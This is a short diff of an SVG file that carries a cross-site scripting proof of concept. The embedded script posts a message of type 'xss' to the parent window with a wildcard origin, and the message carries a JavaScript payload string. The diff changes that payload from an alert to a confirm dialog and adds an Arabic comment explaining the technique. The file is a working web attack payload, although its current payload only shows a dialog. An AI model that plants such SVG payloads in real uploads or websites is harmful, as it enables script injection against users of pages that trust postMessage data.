@@ -1,9 +1,9 @@
-<!-- redirect1.svg -->
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
+    // نرسل كود JS إلى الصفحة الأب عبر postMessage
     window.parent.postMessage({
       type: "xss",
-      payload: "alert('🔥 XSS via postMessage from SVG!')"
+      payload: "confirm('✅ تم تنفيذ XSS عبر postMessage من SVG');"
     }, "*");
   </script>
 </svg>
